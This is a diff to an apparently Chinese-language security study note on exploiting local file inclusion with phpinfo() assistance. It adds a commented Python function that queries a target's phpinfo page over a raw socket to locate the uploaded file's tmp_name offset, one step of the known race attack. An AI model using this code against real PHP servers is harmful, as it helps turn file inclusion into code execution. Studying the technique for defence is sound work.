@@ -22,5 +22,38 @@
     - ![](images/lfi1.jpg)
 
     - ![](images/lfi2.png)
+- 代码中有详细注释
+    ```python
+    def get_offset(host, port, phpinfo_request):
+        """
+        获取tmp_name在phpinfo中的偏移量
+        :param host: HOST
+        :param port: 端口
+        :param phpinfo_request: phpinfo 请求内容
+        :return:
+            tmp_name在phpinfo中的偏移量
+        """
 
+        phpinfo_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        phpinfo_socket.connect((host, port))
+        phpinfo_socket.send(phpinfo_request.encode())
+        phpinfo_response_data = ''
+        while True:
+            i = phpinfo_socket.recv(4096).decode()
+            phpinfo_response_data += i
+            if i == '':
+                break
+
+            # 检测是否是最后一个数据块
+            if i.endswith('0\r\n\r\n'):
+                break
+        phpinfo_socket.close()
+        tmp_name_index = phpinfo_response_data.find('[tmp_name] =&gt')
+        if tmp_name_index == -1:
+            raise ValueError('没有在phpinfo中找到tmp_name')
+        print('找到了 {} 在phpinfo内容索引为{}的位置'.format(
+            phpinfo_response_data[tmp_name_index:tmp_name_index+10], tmp_name_index))
+
+        return tmp_name_index + 256
+    ```
 - 参考: https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf
